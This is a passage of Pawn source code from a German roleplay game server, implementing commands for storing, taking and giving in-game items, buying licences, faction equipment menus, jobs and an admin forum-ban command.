                	PlayerInfo[playerid][pInvWeapon2] = gunID;
                	PlayerInfo[playerid][pInvAmmo2] = gunAmmo;
					RemovePlayerWeapon(playerid, gunID);
                	GetPlayerName(playerid, sendername, sizeof(sendername));
					new gunname[100];
					GetWeaponName(gunID, gunname, sizeof(gunname));
                	format(string, sizeof(string), " %s in die Tasche verstaut.", gunname);
					SendClientMessage(playerid, COLOR_GREY, string);
                	return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Du hast keine Waffe, die du in die Tasche verstauen kannst!");
				    return 1;
				}
			}
			if(strcmp(namen,"Drogen", true) == 0)
			{
   				tmp = strtoknew(cmdtext, idx);
		     	if(!strlen(tmp))
		      	{
			     	SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /verstauen Drogen [Menge]");
			     	format(string, sizeof(string), "Du hast %d Drogen dabei.", PlayerInfo[playerid][pDrugs]);
				    SendClientMessage(playerid, COLOR_GRAD3, string);
			     	return 1;
		      	}
         		new tdrugs;
      			tdrugs = strval(tmp);
         		if(!strlen(tmp))
		      	{
			     	SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /verstauen Drogen [Menge]");
			     	format(string, sizeof(string), "  Du hast %d Drogen dabei.", PlayerInfo[playerid][pDrugs]);
				    SendClientMessage(playerid, COLOR_GRAD3, string);
				    return 1;
		      	}
		      	if(tdrugs + PlayerInfo[playerid][pInvDrugs] > 60)
		      	{
		      	    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst maximal 60 Gramm Drogen in deiner Tasche verstauen!");
		      	    return 1;
				}
         		if(tdrugs > PlayerInfo[playerid][pDrugs])
           		{
             		SendClientMessage(playerid, COLOR_GRAD2, "So viele Drogen hast du nicht dabei!");
               		return 1;
              	}
              	PlayerInfo[playerid][pDrugs] -= tdrugs;
               	PlayerInfo[playerid][pInvDrugs] += tdrugs;
               	format(string, sizeof(string), "%d Gramm Drogen in die Tasche verstaut.", tdrugs);
               	SendClientMessage(playerid, COLOR_GRAD4, string);
                return 1;
			}
			if(strcmp(namen,"Materialien", true) == 0)
			{
				tmp = strtoknew(cmdtext, idx);
    			if(!strlen(tmp))
	      		{
		     		SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /verstauen Materialien [Menge]");
		     		format(string, sizeof(string), "Du hast %d Materialien dabei", PlayerInfo[playerid][pMats]);
		     		SendClientMessage(playerid, COLOR_GRAD3, string);
		     		return 1;
	      		}
       	 		new matss;
           		matss = strval(tmp);
             	if(!strlen(tmp))
	      		{
		     		SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /verstauen Materialien [Menge]");
		     		format(string, sizeof(string), "  Du hast %d Materialien dabei.", PlayerInfo[playerid][pMats]);
		     		SendClientMessage(playerid, COLOR_GRAD3, string);
		     		return 1;
	      		}
	      		if(matss + PlayerInfo[playerid][pInvMats] > 4000)
	      		{
	      		    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst maximal 4000 Materials in deiner Tasche verstauen!");
	      		    return 1;
				}
         		if(matss > PlayerInfo[playerid][pMats])
           		{
             		SendClientMessage(playerid, COLOR_GRAD2, "So viele Materialien hast du dabei!");
               		return 1;
              	}
               	PlayerInfo[playerid][pMats] -= matss;
               	PlayerInfo[playerid][pInvMats] += matss;
               	format(string, sizeof(string), "%d Materialien in die Tasche verstaut.", matss);
                SendClientMessage(playerid, COLOR_GRAD4, string);
                return 1;
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Ungültiger Name!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du musst dich erst einloggen!");
		}
		return 1;
	}

//============= /nehmen =================//
	if(strcmp(cmd, "/nehmen", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Diese Aktion kann hier nicht ausgeführt werden!");
		if(IsPlayerConnected(playerid))
		{
		    new namen[256];
		    namen = strtoknew(cmdtext, idx);
		    if(!strlen(namen))
		    {
		        SendClientMessage(playerid, COLOR_GOLD, "|__________________ Befehlshilfe _________________|");
		        SendClientMessage(playerid, COLOR_GOLD, "Benutzung: /nehmen [Name] ([Menge])");
		        SendClientMessage(playerid, COLOR_GOLD, "Namen: Waffe1, Waffe2, Materialien, Drogen");
		        return 1;
			}
			if(strcmp(namen,"Waffe1", true) == 0)
			{
            	if(PlayerInfo[playerid][pInvWeapon] != 0 && PlayerInfo[playerid][pInvAmmo] != 0)
            	{
                	new gunname[100];
                	GetWeaponName(PlayerInfo[playerid][pInvWeapon], gunname, sizeof(gunname));
                	SafeServerWeapon(playerid, PlayerInfo[playerid][pInvWeapon], PlayerInfo[playerid][pInvAmmo]);
      				format(string, sizeof(string), " %s aus der Tasche rausgeholt.", gunname);
      				SendClientMessage(playerid, COLOR_GREY, string);
      				PlayerInfo[playerid][pInvWeapon] = 0;
                	PlayerInfo[playerid][pInvAmmo] = 0;
				}
            	else
            	{
                	SendClientMessage(playerid, COLOR_GREY, "Du hast keine Waffe in deiner Tasche!");
                	return 1;
            	}
			}
			else if(strcmp(namen,"Waffe2", true) == 0)
			{
			    if(PlayerInfo[playerid][pInvWeapon2] != 0 && PlayerInfo[playerid][pInvAmmo2] != 0)
			    {
			        new gunname[100];
					GetWeaponName(PlayerInfo[playerid][pInvWeapon2], gunname, sizeof(gunname));
					SafeServerWeapon(playerid, PlayerInfo[playerid][pInvWeapon2], PlayerInfo[playerid][pInvAmmo2]);
					format(string, sizeof(string), " %s aus der Tasche rausgeholt.", gunname);
					SendClientMessage(playerid, COLOR_GREY, string);
					PlayerInfo[playerid][pInvWeapon2] = 0;
					PlayerInfo[playerid][pInvAmmo2] = 0;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Du hast keine Waffe in deiner Tasche!");
				    return 1;
				}
			}
			else if(strcmp(namen,"Drogen", true) == 0)
			{
   				tmp = strtoknew(cmdtext, idx);
		     	if(!strlen(tmp))
		      	{
			     	SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /nehmen Drogen [Menge]");
			     	format(string, sizeof(string), "  Du hast %d Drogen in deiner Tasche.", PlayerInfo[playerid][pInvDrugs]);
				    SendClientMessage(playerid, COLOR_GRAD3, string);
			     	return 1;
		      	}
         		new tdrugs;
      			tdrugs = strval(tmp);
         		if(!strlen(tmp))
		      	{
			     	SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /nehmen Drogen [Menge]");
			     	format(string, sizeof(string), "  Du hast %d Drogen in deiner Tasche.", PlayerInfo[playerid][pInvDrugs]);
				    SendClientMessage(playerid, COLOR_GRAD3, string);
				    return 1;
		      	}
         		if(tdrugs > PlayerInfo[playerid][pInvDrugs])
           		{
             		SendClientMessage(playerid, COLOR_GRAD2, "So viele Drogen hast du nicht in deiner Tasche!");
               		return 1;
              	}
              	PlayerInfo[playerid][pInvDrugs] -= tdrugs;
               	PlayerInfo[playerid][pDrugs] += tdrugs;
               	format(string, sizeof(string), "%d Gramm Drogen aus der Tasche genommen.", tdrugs);
               	SendClientMessage(playerid, COLOR_GRAD4, string);
                return 1;
			}
			else if(strcmp(namen,"Materialien", true) == 0)
			{
				tmp = strtoknew(cmdtext, idx);
    			if(!strlen(tmp))
	      		{
		     		SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /nehmen Materialien [Menge]");
		     		format(string, sizeof(string), "Du hast %d Materialien aus der Tasche genommen.", PlayerInfo[playerid][pBoxMats]);
		     		SendClientMessage(playerid, COLOR_GRAD3, string);
		     		return 1;
	      		}
       	 		new matss;
           		matss = strval(tmp);
             	if(!strlen(tmp))
	      		{
		     		SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /nehmen Materialien [Menge]");
		     		format(string, sizeof(string), "  Du hast %d Materialien aus der Tasche genommen.", PlayerInfo[playerid][pBoxMats]);
		     		SendClientMessage(playerid, COLOR_GRAD3, string);
		     		return 1;
	      		}
         		if(matss > PlayerInfo[playerid][pInvMats])
           		{
             		SendClientMessage(playerid, COLOR_GRAD2, "So viele Materialien hast du nicht in deiner Tasche!");
               		return 1;
              	}
              	if(matss + PlayerInfo[playerid][pMats] > 2000)
              	{
              	    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst maximal 2000 Materialien tragen.");
              	    return 1;
				}
               	PlayerInfo[playerid][pInvMats] -= matss;
               	PlayerInfo[playerid][pMats] += matss;
               	format(string, sizeof(string), "%d Materialien aus der Tasche genommen.", matss);
                SendClientMessage(playerid, COLOR_GRAD4, string);
                return 1;
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Ungültiger Name!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du musst dich erst einloggen!");
		}
		return 1;
	}

//============= NEUES /GIVE ================//
	if(strcmp(cmd, "/give", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new x_nr[256];
	        x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr))
			{
			    SendClientMessage(playerid, COLOR_GOLD, "|____________________ Befehlshilfe ___________________|");
			    SendClientMessage(playerid, COLOR_GOLD, "Benutzung: /give [Name] [Spieler ID] ([Menge])");
				SendClientMessage(playerid, COLOR_GOLD, "Namen: Drogen, Waffe, Materialien");
				return 1;
			}
			if(strcmp(x_nr,"Drogen",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Drogen [Spieler ID] [Menge]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        new Float:x, Float:y, Float:z;
			            GetPlayerPos(giveplayerid,x,y,z);
			            if(!PlayerToPoint(5, playerid, x, y, z))
			            {
			                SendClientMessage(playerid, COLOR_GRAD1, "Spieler nicht in deiner Nähe!");
			                return 1;
			            }
						tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Drogen [Spieler ID] [Menge]");
							return 1;
						}
						new dammount;
						dammount = strval(tmp);
						if(dammount > PlayerInfo[playerid][pDrugs])
					 	{
					 		SendClientMessage(playerid, COLOR_GREY, "Du hast nicht soviele Drogen!"); return 1;
					 	}
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						PlayerInfo[playerid][pDrugs] -= dammount;
						PlayerInfo[giveplayerid][pDrugs] += dammount;
						format(string, sizeof(string), "* %s gibt %s Drogen.", sendername, giveplayer);
						ProxDetector(6.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist Offline!");
				    return 1;
				}
			}
			else if(strcmp(x_nr,"Waffe",true) == 0)
			{
			    if(IsPlayerConnected(playerid))
			    {
					tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /givewaffe [PlayerID]");
						return 1;
					}
					new playa;
					playa = ReturnUser(tmp);
					if(IsPlayerConnected(playa))
					{
					    if(playa != INVALID_PLAYER_ID)
					    {
							if (ProxDetectorS(8.0, playerid, playa))
							{
							    if(playa == playerid)
							    {
							        SendClientMessage(playerid, COLOR_GREY, "Du kannst dir selber keine Waffe geben!");
							        return 1;
							    }
								if(IsPlayerInAnyVehicle(playa))
								{
								    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keinem im Auto eine Waffe übergeben!");
								    return 1;
								}
								new gunID = GetPlayerWeapon(playerid);
								new needed = GetPlayerAmmo(playerid);
								GetPlayerName(playerid, sendername, sizeof(sendername));
								GetPlayerName(playa, giveplayer, sizeof(giveplayer));
								ServerWeapon(playa, gunID, needed);
								RemovePlayerWeapon(playerid, gunID);
		  						format(string, sizeof(string),  "%s gibt %s seine Waffe.", sendername, giveplayer);
		    					ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		    					return 1;
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht nah genug!");
							}
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist offline.");
					}
				}
			}
			else if(strcmp(x_nr,"Materialien",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Materialien [Spieler ID] [Menge]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        new Float:x, Float:y, Float:z;
			            GetPlayerPos(giveplayerid,x,y,z);
			            if(!PlayerToPoint(5, playerid, x, y, z))
			            {
			                SendClientMessage(playerid, COLOR_GRAD1, "Spieler nicht in deiner Nähe!");
			                return 1;
			            }
						tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Materialien [Spieler ID] [Menge]");
							return 1;
						}
						new dammount;
						dammount = strval(tmp);
						if(dammount > PlayerInfo[playerid][pMats]) { SendClientMessage(playerid, COLOR_GREY, "Du hast nicht soviele Materialien!"); return 1; }
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						PlayerInfo[playerid][pMats] -= dammount;
						PlayerInfo[giveplayerid][pMats] += dammount;
						format(string, sizeof(string), "* %s gibt %s Materialien.", sendername, giveplayer);
						ProxDetector(6.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist Offline!");
				    return 1;
				}
			}
		}
		return 1;
	}
*/





	if(strcmp(cmd, "/give", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new x_nr[256];
	        x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr))
			{
			    SendClientMessage(playerid, COLOR_GRAD2, "|____________________ Befehlshilfe ___________________|");
			    SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /give [Name] [Spieler ID] ([Menge])");
				SendClientMessage(playerid, COLOR_GRAD2, "Namen: Drogen, Materialien");
				return 1;
			}
			if(strcmp(x_nr,"Drogen",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Drogen [Spieler ID] [Menge]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        new Float:x, Float:y, Float:z;
			            GetPlayerPos(giveplayerid,x,y,z);
			            if(!PlayerToPoint(5, playerid, x, y, z))
			            {
			                SendClientMessage(playerid, COLOR_GRAD1, "Spieler nicht in deiner Nähe!");
			                return 1;
			            }
						tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Drogen [Spieler ID] [Menge]");
							return 1;
						}
						new dammount;
						dammount = strval(tmp);
						if(dammount > PlayerInfo[playerid][pDrugs])
					 	{
					 		SendClientMessage(playerid, COLOR_GREY, "Du hast nicht soviele Drogen!"); return 1;
					 	}
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						PlayerInfo[playerid][pDrugs] -= dammount;
						PlayerInfo[giveplayerid][pDrugs] += dammount;
						format(string, sizeof(string), "* %s gibt %s Drogen.", sendername, giveplayer);
						ProxDetector(6.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist Offline!");
				    return 1;
				}
			}

			else if(strcmp(x_nr,"Materialien",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Materialien [Spieler ID] [Menge]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        new Float:x, Float:y, Float:z;
			            GetPlayerPos(giveplayerid,x,y,z);
			            if(!PlayerToPoint(5, playerid, x, y, z))
			            {
			                SendClientMessage(playerid, COLOR_GRAD1, "Spieler nicht in deiner Nähe!");
			                return 1;
			            }
						tmp = strtoknew(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /give Materialien [Spieler ID] [Menge]");
							return 1;
						}
						new dammount;
						dammount = strval(tmp);
						if(dammount > PlayerInfo[playerid][pMats]) { SendClientMessage(playerid, COLOR_GREY, "Du hast nicht soviele Materialien!"); return 1; }
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						PlayerInfo[playerid][pMats] -= dammount;
						PlayerInfo[giveplayerid][pMats] += dammount;
						format(string, sizeof(string), "* %s gibt %s Materialien.", sendername, giveplayer);
						ProxDetector(6.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist Offline!");
				    return 1;
				}
			}
		}
		return 1;
	}





    if(strcmp("/fahrschein", cmdtext, true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid,3.0,1369.5651,-1647.7888,13.3828))
	    {
			if(PlayerInfo[playerid][pLevel] >= 1)
			{
			    if(GetPlayerMoneySave(playerid) >= 8750)
			    {
			        if(PlayerInfo[playerid][pCarLic] >= 1)
			        {
			            SendClientMessage(playerid, COLOR_RED, "Du hast bereits den Führerschein");
			        }
			        else
			        {
			            SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir den Führerschein für 8750$ gekauft.");
						PlayerInfo[playerid][pCarLic] = 1;
						GivePlayerMoneySave(playerid, -8750);
			        }

			    }
			    else
				{
				SendClientMessage(playerid, COLOR_RED, "Du kannst dir den Führerschein nicht leisten"); }
			}
		}
		else
		{
		SendClientMessage(playerid, COLOR_RED, "Du bist nicht bei der Fahrschule!"); }
		return 1;
	}
//=================== Flugschein ================//
if(strcmp("/Flugschein", cmdtext, true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid,3.0,1952.8041,-2178.1680,13.5469))
	    {
			if(PlayerInfo[playerid][pLevel] >= 1)
			{
			    if(GetPlayerMoneySave(playerid) >= 8750)
			    {
			        if(PlayerInfo[playerid][pFlyLic] >= 1)
			        {
			            SendClientMessage(playerid, COLOR_RED, "Du hast bereits den Flugschein");
			        }
			        else
			        {
			            SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir den Flugschein für 8750$ gekauft.");
						PlayerInfo[playerid][pFlyLic] = 1;
						GivePlayerMoneySave(playerid, -8750);
			        }

			    }
			    else { SendClientMessage(playerid, COLOR_RED, "Du kannst dir den Flugschein nicht leisten"); }
			}
		}
		else { SendClientMessage(playerid, COLOR_RED, "Du bist nicht am Airport Gelände"); }
	}
//=================== Buywaffenschein ============//
	if(strcmp("/waffenschein", cmdtext, true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid,3.0,1364.03,-1266.51,13.55))
	    {
	        if(PlayerInfo[playerid][pLevel] >= 2)
	        {
				if(GetPlayerMoneySave(playerid) >= 10000)
				{
					if(PlayerInfo[playerid][pGunLic] >= 1)
     				{
                        SendClientMessage(playerid, COLOR_RED, "Du hast bereits den Waffenschein");
					}
					else
					{
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir einen Waffenschein für 10.000$ gekauft.");
						PlayerInfo[playerid][pGunLic] = 1;
						GivePlayerMoneySave(playerid, -10000);
					}
				}
				else { SendClientMessage(playerid, COLOR_RED, "Du kannst dir den Waffenschein nicht leisten"); }
			}
			else { SendClientMessage(playerid, COLOR_RED, "Du hast nicht das erforderte Level 2"); }
	    }
	    else { SendClientMessage(playerid, COLOR_RED, "Du bist beim Ammunation");
		}
		return 1;
	}
	if(strcmp(cmdtext, "/equip", true) == 0)
	{
        if(PlayerInfo[playerid][sMember] == 24)
	    {
	        if (IsPlayerInRangeOfPoint(playerid, 7.0, 325.4559,307.0085,999.1484))
	        {
			ServerWeapon(playerid, 24,120);
			SetPlayerArmour(playerid, 100.0);
			SetPlayerHealth(playerid, 100.0);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir eine Deagle und einen Schlagstock sowie Volles leben erhalten!");
			}
        }
		return 1;
    }
	if(strcmp(cmdtext, "/ausruesten", true) == 0)
	{
        if(PlayerInfo[playerid][sMember] == 1 ||PlayerInfo[playerid][sMember] == 2||PlayerInfo[playerid][sMember] == 3||PlayerInfo[playerid][sMember] == 22)
	    {
			for(new i = 0; i <  sizeof(FrakInfo); i++)
			{
				if(PlayerInfo[playerid][pLocal]-99 == i)
				{
					if (IsPlayerInRangeOfPoint(playerid,3.0,FrakInfo[i][fExitX], FrakInfo[i][fExitY], FrakInfo[i][fExitZ]))
					{
						if(FrakInfo[i][fFrak] == PlayerInfo[playerid][sMember])
						{
						    new frakstring[512];
							format(frakstring, sizeof(frakstring), "Materialen: %d.", FrakInfo[i][fMats]);
							ShowPlayerDialog(playerid,DIALOG_FBIEQUIP,DIALOG_STYLE_LIST,frakstring,"1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. 9mm\n6. Schlagstock\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
							return 1;
	           			 }
	         		}
				}
			}
		}
		else
	    {
			for(new i = 0; i <  sizeof(FrakInfo); i++)
			{
				if(PlayerInfo[playerid][pLocal]-99 == i)
				{
					if (IsPlayerInRangeOfPoint(playerid,3.0,FrakInfo[i][fExitX], FrakInfo[i][fExitY], FrakInfo[i][fExitZ]))
					{
						if(FrakInfo[i][fFrak] == PlayerInfo[playerid][sMember])
						{
						    new frakstring[512];
							format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
							ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
							return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht Mitglied der jeweiligen Fraktion!");
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht an der Fraktionskammer!");
					}
				}
			}

         }
	    return 1;
	}
/*
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
					return 1;
				}
*/
//================= NAVIGATION ===============//
	if(strcmp("/navi", cmdtext, true) == 0 || strcmp("/navigation", cmdtext, true) == 0)
	{
 		ShowPlayerDialog(playerid, NAVIHAUPT, DIALOG_STYLE_LIST, "Navigationsmenü", "Tuningshops\nAutohäuser\nGeschäfte\nGang- und Mafien-Orte\nFahrschule", "Auswählen", "Beenden");
		return 1;
	}
	if (strcmp("/kampfstyles", cmdtext, true, 10) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, 773.6705,3.1167,1000.7171))
	    {
			ShowPlayerDialog(playerid, KAMPFSTYLES, DIALOG_STYLE_LIST, "Kampf Styles", "Elbow(Level 3)\nBoxing(Level 4)\nGrabkick(Level 8)\nKneehead(Level 10)\nKungfu(Level 15)\nNormal(Level 1)", "Auswählen", "Abbrechen");
			return 1;
		}
	}

//============= /job =============//


	if(strcmp("/quitjob", cmdtext, true) == 0)
	{
	    if(PlayerInfo[playerid][pichmusskuedigen] == 1) return SCM(playerid,-1,"Dein Job wird beim nächsten PayDay bereits gekündigt!");
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast die Kündigung unterschrieben, Dein Job wird zum nächsten Payday gekündigt!");
		PlayerInfo[playerid][pichmusskuedigen] = 1;
		return 1;
	}
	if(strcmp("/job", cmdtext, true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, 363.3297,173.7336,1008.3828))
	    {
	        ShowPlayerDialog(playerid, DIALOG_iJOBS, DIALOG_STYLE_LIST, "Jobangebote", "Waffendealer\nDrogendealer\nFarmer\nDedektiv\nBusfahrer\nPilot\nZugfahrer\nAnwalt\nMüllfahrer", "Auswählen", "Abbrechen");
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht in der Stadthalle!");
		}
		return 1;
	}

//============= /DRIVEIN ============//
	if(strcmp("/drivein", cmdtext, true) == 0)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 15.0, 1214.4454,-904.4616,42.9208) || IsPlayerInRangeOfPoint(playerid, 15.0, 799.1068,-1629.4493,12.9548))
	    {
	        if(!IsPlayerInAnyVehicle(playerid))
	        {
	            SendClientMessage(playerid, COLOR_GRAD1, "Du bist in keinem Fahrzeug!");
	            return 1;
			}
	        FreezePlayer(playerid);
	        ShowPlayerDialog(playerid, BSN, DIALOG_STYLE_LIST, "BSN - Drive IN Bestellung", "3 Chicken Nuggets (3$)\n12 Chicken Nuggets (10$)\n20 Chicken Nuggets (16$)\nPommes (2$)\nCheesburger (5$)\nChickenburger (8$)\nBig Mac (10$)\nCola (3$)\nFanta (3$)\nSprite (3$)", "Kaufen", "Abbrechen");
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht am Drive In Schalter am BSN!");
		}
		return 1;
	}
/*
	if(strcmp(cmd, "/skick", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /skick [playerid]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 2002 || PlayerInfo[playerid][pSupporter] >= 1)
			{
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
				        if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
						{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht kicken, da er ein höheres Adminlevel hat als du!");
							return 1;
						}

						if(PlayerInfo[giveplayerid][pIsPlayerProjektleiter] == 1)
						{
						    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht kicken, da er der Serverowner ist!");
							return 1;
						}

						new year, month,day;
						getdate(year, month, day);
						format(string, sizeof(string), "AdmCmd: %s hat von %s einen Silent kick bekommen.(%d-%d-%d)", giveplayer, sendername,month,day,year);
						SKickLog(string);
						Kick(giveplayerid);
						return 1;
				    }
				}
			}
			else
			{
				format(string, sizeof(string), "   %d ist kein Aktiver Spieler.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
*/
	if(strcmp(cmd, "/forumban", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /forumban [playerid] [grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 2000)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
						    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							new length = strlen(cmdtext);
							while ((idx < length) && (cmdtext[idx] <= ' '))
							{
								idx++;
							}
							new offset = idx;
							new result[64];
							while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
							{
								result[idx - offset] = cmdtext[idx];
								idx++;
							}
							result[idx - offset] = EOS;
							if(!strlen(result))
							{
								SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /forumban [playerid] [grund]");
								return 1;
							}


							if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
							{
							    SendClientMessage(playerid, COLOR_GRAD2, "Du kannst diesen Spieler nicht bannen, da er ein höheres Adminlevel hat als du!");
								return 1;
							}

							format(string, sizeof(string), "%s - Gesperrt von %s",(result),sendername);
							WBB_BanUsername(giveplayer, string);

						    new year, month,day;
							getdate(year, month, day);
